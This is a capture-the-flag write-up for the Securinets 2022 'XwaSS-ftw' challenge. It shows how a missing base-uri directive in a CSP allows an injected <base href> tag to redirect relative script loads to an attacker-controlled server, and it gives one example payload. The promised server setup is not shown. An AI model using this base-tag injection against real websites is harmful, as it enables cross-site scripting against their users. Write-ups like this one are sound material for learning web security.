# Securinets-CTF-Finals-2022  
## XwaSS-ftw Writeup


This challenge was about achieving an XSS by bypassing the CSP

Challenge :

![image](https://user-images.githubusercontent.com/58823465/167916910-78285058-5944-4b8d-8de8-55650fc0cca5.png)


We can find the CSP in the source code 

``` 
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-uupQ2er9ZEFzu3';connect-src 'self';style-src 'self';font-src 'self';object-src 'none'">
```

Using the CSP validator

![image](https://user-images.githubusercontent.com/58823465/167917258-82fea6ed-7a13-4b8c-838d-e240c89e3966.png)

We can see the the "base-uri missing" meaning we can use `` <base> `` tags and use a technique called Dangling Markup injection.

So to abuse this we can try and redirect to a url just to test if the base tags are working

we can use this payloads 

```
'><base href="https://example.com">
``` 

![image](https://user-images.githubusercontent.com/58823465/167918956-ef963dd8-37d1-4fcd-87af-441eee9ce375.png)


and we can notice in the console this particular error 

![image](https://user-images.githubusercontent.com/58823465/167918067-d5b8dc28-87d5-4709-90e0-dd8c7af14469.png)

This means it's trying to fetch the relative path `` /assets/js/bootstrap.js ``, so all we need to do is spin up our own server and add the same relative path and inject some xss in the file "bootstrap.js"

So this is the setup for the server 



note: if you're using a VM make sure you're using NAT for the ngrok server to work 🙃 .. it took me a while to notice that my VM was on bridged mode)
